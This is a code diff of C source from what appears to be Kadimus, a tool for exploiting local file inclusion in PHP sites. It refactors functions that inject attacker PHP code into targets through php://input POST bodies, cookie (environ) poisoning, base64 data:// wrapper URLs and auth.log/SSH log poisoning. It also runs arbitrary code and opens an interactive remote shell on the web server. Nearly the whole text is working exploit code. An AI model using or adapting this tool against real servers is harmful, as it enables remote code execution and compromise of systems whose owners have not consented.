@@ -1,11 +1,51 @@
 #include "kadimus_xpl.h"
 
-void build_rce_exploit(CURL *curl, const char *base_uri,
-    struct parameter_list *plist, size_t pos, rce_type tech,
-    const char *php_code);
+char *build_datawrap(const char *phpcode){
+    char *ret, *b64;
+    size_t len;
+    b64 = b64encode(phpcode, strlen(phpcode));
+    len = strlen(b64);
 
-char *build_datawrap_url(const char *base, struct parameter_list *plist,
-    int p, const char *phpcode);
+    ret = xmalloc(len + DATAWRAPLEN + 1);
+    memcpy(ret, DATA_WRAP, DATAWRAPLEN);
+    memcpy(ret+DATAWRAPLEN, b64, len);
+    ret[len+DATAWRAPLEN] = 0x0;
+
+    free(b64);
+    return ret;
+}
+
+void build_rce_exploit(CURL *curl, const char *url, const char *pname,
+    const char *phpcode, int tech){
+    char *cookieptr, *data_wrap_uri, *aux;
+
+    switch(tech){
+        case INPUT:
+        case AUTH:
+            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, strlen(phpcode));
+            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, phpcode);
+        break;
+
+        case ENVIRON:
+            if(global.cookies){
+                cookieptr = cookie_append(global.cookies, phpcode);
+                curl_easy_setopt(curl, CURLOPT_COOKIE, cookieptr);
+                free(cookieptr);
+            } else {
+                curl_easy_setopt(curl, CURLOPT_COOKIE, phpcode);
+            }
+        break;
+
+        case DATA:
+            aux = build_datawrap(phpcode);
+            data_wrap_uri = build_url_simple(url, pname, aux, replace_string);
+            curl_easy_setopt(curl, CURLOPT_URL, data_wrap_uri);
+            free(data_wrap_uri);
+            free(aux);
+        break;
+    }
+}
+
 
 bool check_auth_poison(const char *target){
     char *phpcode, rstr[R_SIZE], regex[VULN_SIZE], rfile[20], *mapfile;
@@ -25,7 +65,7 @@ bool check_auth_poison(const char *target){
     build_regex(regex, rstr, "Vulnerable");
     phpcode = make_code(rstr, "<?php echo \"Vulnerable\"; ?>", true);
 
-    build_rce_exploit(curl, NULL, NULL, 0, AUTH, phpcode);
+    build_rce_exploit(curl, NULL, NULL, phpcode, AUTH);
 
     if(HttpRequest(curl)){
         fclose(fh);
@@ -82,58 +122,6 @@ bool ssh_log_poison(const char *target, int port){
     }
 
     ssh_free(ssh_id);
-    return ret;
-}
-
-
-void build_rce_exploit(CURL *curl, const char *base,
-    struct parameter_list *plist, size_t pos, rce_type tech,
-    const char *phpcode){
-    char *cookieptr;
-    char *data_wrap_uri;
-
-    switch(tech){
-        case INPUT:
-        case AUTH:
-            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, strlen(phpcode));
-            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, phpcode);
-        break;
-
-        case ENVIRON:
-            if(global.cookies){
-                cookieptr = cookie_append(global.cookies, phpcode);
-                curl_easy_setopt(curl, CURLOPT_COOKIE, cookieptr);
-                free(cookieptr);
-            } else {
-                curl_easy_setopt(curl, CURLOPT_COOKIE, phpcode);
-            }
-        break;
-
-        case DATA:
-            data_wrap_uri = build_datawrap_url(base, plist, pos, phpcode);
-            curl_easy_setopt(curl, CURLOPT_URL, data_wrap_uri);
-            free(data_wrap_uri);
-        break;
-    }
-}
-
-char *build_datawrap_url(const char *base, struct parameter_list *plist, int p, const char *phpcode){
-    char *b64, *xpl, *ret;
-    size_t b64_len;
-
-    b64 = b64encode(phpcode, strlen(phpcode));
-    b64_len = strlen(b64);
-
-    xpl = xmalloc(b64_len + DATAWRAPLEN + 1);
-
-    memcpy(xpl, DATA_WRAP, DATAWRAPLEN);
-    memcpy(xpl+DATAWRAPLEN, b64, b64_len);
-    xpl[b64_len+DATAWRAPLEN] = 0x0;
-
-    ret = build_url(base, plist, p, xpl, replace_string);
-
-    free(b64);
-    free(xpl);
     return ret;
 }
 
@@ -254,7 +242,7 @@ int rce_scan(const char *base, struct parameter_list *plist, int p){
         rce_uri = build_url(base, plist, p, input_t[i], replace_string);
 
         curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
-        build_rce_exploit(curl, NULL, NULL, 0, INPUT, php_code);
+        build_rce_exploit(curl, NULL, NULL, php_code, INPUT);
         info_single("requesting: %s\n", rce_uri);
 
         if(!HttpRequest(curl)){
@@ -293,7 +281,7 @@ int rce_scan(const char *base, struct parameter_list *plist, int p){
         info_single("requesting: %s\n", rce_uri);
 
         curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
-        build_rce_exploit(curl, NULL, NULL, 0, ENVIRON, php_code);
+        build_rce_exploit(curl, NULL, NULL, php_code, ENVIRON);
 
         if(!HttpRequest(curl)){
             error_single("request error\n");
@@ -326,7 +314,8 @@ int rce_scan(const char *base, struct parameter_list *plist, int p){
 
     info_single("testing data wrap ...\n");
 
-    char *datawrap = build_datawrap_url(base, plist, p, php_code);
+    char *b64datawrap = build_datawrap(php_code);
+    char *datawrap = build_url(base, plist, p, b64datawrap, replace_string);
     curl_easy_setopt(curl, CURLOPT_URL, datawrap);
 
     if(!HttpRequest(curl)){
@@ -350,7 +339,7 @@ int rce_scan(const char *base, struct parameter_list *plist, int p){
     curl_easy_cleanup(curl);
     xfree(body.ptr);
     free(datawrap);
-
+    free(b64datawrap);
     /* auth.log scan */
     //curl = init_curl(&body);
 
@@ -534,15 +523,11 @@ int check_files(char *base, struct parameter_list *plist, int p){
 }
 
 void exec_phpcode(const char *url, const char *parameter, const char *code, int type){
-    char *base = NULL, *rce_code, rbuf[8], regex[M_ALL_SIZE];
-    struct parameter_list plist = {0};
+    char *rce_code, rbuf[8], regex[M_ALL_SIZE];
     struct curl_slist *chunk = NULL;
-
-    void *plistptr = NULL;
     struct request body;
     char **match = NULL;
     CURL *curl;
-    size_t pos;
     int len = 0;
 
     init_str(&body);
@@ -550,26 +535,12 @@ void exec_phpcode(const char *url, const char *parameter, const char *code, int 
 
     info_single("trying exec code ...\n");
 
-    if(type == DATA){
-        if(!get_element_pos(&plist, &base, url, parameter, &pos)){
-            error_single("[-] Parameter: %s not found !!!\n", parameter);
-
-            curl_easy_cleanup(curl);
-            free(body.ptr);
-
-            return;
-        }
-
-        plistptr = &plist;
-    } else {
-        curl_easy_setopt(curl, CURLOPT_URL, url);
-    }
-
+    curl_easy_setopt(curl, CURLOPT_URL, url);
     chunk = curl_slist_append(chunk, "Connection: close");
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
 
     rce_code = make_code(random_string(rbuf, sizeof(rbuf)), code, (type == AUTH));
-    build_rce_exploit(curl, base, plistptr, pos, type, rce_code);
+    build_rce_exploit(curl, url, parameter, rce_code, type);
 
     build_regex(regex, rbuf, "(.*)");
 
@@ -595,9 +566,7 @@ void exec_phpcode(const char *url, const char *parameter, const char *code, int 
 }
 
 void rce_http_shell(const char *url, const char *parameter, int technique){
-    size_t pos;
-    struct parameter_list plist={0};
-    char *base, *aux, *phpcode, **match;
+    char *aux, *phpcode, **match;
     void *map;
     size_t mapsize;
     int fd, len;
@@ -618,15 +587,7 @@ void rce_http_shell(const char *url, const char *parameter, int technique){
 
     curl = init_curl(bodyptr);
 
-    if(technique == DATA){
-        if(!get_element_pos(&plist, &base, url, parameter, &pos)){
-            printf("[-] Parameter: %s not found !!!\n", parameter);
-            curl_easy_cleanup(curl);
-            return;
-        }
-    } else {
-        curl_easy_setopt(curl, CURLOPT_URL, url);
-    }
+    curl_easy_setopt(curl, CURLOPT_URL, url);
 
     random_string(randomstr, sizeof(randomstr));
     build_regex(regex, randomstr, "(.*)");
@@ -663,7 +624,7 @@ void rce_http_shell(const char *url, const char *parameter, int technique){
             curl_easy_setopt(curl, CURLOPT_WRITEDATA, fh);
         }
 
-        build_rce_exploit(curl, base, &plist, pos, technique, phpcode);
+        build_rce_exploit(curl, url, parameter, phpcode, technique);
 
         if(HttpRequest(curl)){
             if(technique == AUTH){
@@ -698,12 +659,6 @@ void rce_http_shell(const char *url, const char *parameter, int technique){
     }
 
     free(aux);
-
-    if(technique == DATA){
-        free(base);
-        free(plist.trash);
-        free(plist.parameter);
-    }
 
     curl_easy_cleanup(curl);
 }
